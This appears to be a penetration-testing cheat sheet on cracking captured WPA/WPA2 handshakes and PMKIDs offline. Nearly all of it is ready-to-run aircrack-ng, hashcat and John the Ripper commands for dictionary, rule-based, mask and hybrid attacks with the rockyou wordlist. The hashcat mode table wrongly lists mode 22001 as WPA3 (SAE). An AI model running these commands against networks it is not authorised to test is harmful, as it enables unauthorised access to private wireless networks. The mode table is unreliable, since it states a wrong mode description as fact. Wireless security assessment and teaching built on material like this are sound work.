# WPA/WPA2 PSK Cracking

Once you have a handshake or PMKID, crack the PSK offline.

## Cracking with aircrack-ng
```bash
# Basic dictionary attack
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# With BSSID filter
aircrack-ng -w passwords.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
```

## Cracking with Hashcat (GPU accelerated)
```bash
# Convert .cap to hashcat format (.hccapx or .hc22000)

# Method 1: Using cap2hccapx (for WPA handshake - mode 2500)
cap2hccapx handshake-01.cap handshake.hccapx

# Crack with hashcat (mode 2500 = WPA/WPA2 handshake)
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt --force

# Method 2: Using hcxpcapngtool (modern format - mode 22000)
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# Crack with hashcat (mode 22000 = WPA/WPA2/PMKID/EAPOL)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Show cracked password
hashcat -m 22000 hash.hc22000 --show
```

## Hashcat Attack Modes
```bash
# Dictionary attack
hashcat -m 22000 hash.txt rockyou.txt

# Rule-based attack (mutations)
hashcat -m 22000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (brute force pattern - 8 lowercase)
hashcat -m 22000 hash.txt -a 3 ?l?l?l?l?l?l?l?l

# Hybrid: wordlist + mask suffix
hashcat -m 22000 hash.txt -a 6 rockyou.txt ?d?d?d?d

# Hybrid: mask prefix + wordlist
hashcat -m 22000 hash.txt -a 7 ?d?d?d?d rockyou.txt
```

## Hashcat Modes for Wireless
| Mode | Description |
|---|---|
| 22000 | WPA/WPA2/PMKID/EAPOL (modern universal) |
| 2500 | WPA/WPA2 handshake (hccapx format) |
| 16800 | WPA-PMKID-PBKDF2 |
| 22001 | WPA3 (SAE) |
| 16801 | WPA-PMKID-PMK (without PBKDF2) |

## Cracking with John the Ripper
```bash
# John can also crack WPA, but hashcat is much faster
john --wordlist=/usr/share/wordlists/rockyou.txt handshake.hccapx
```
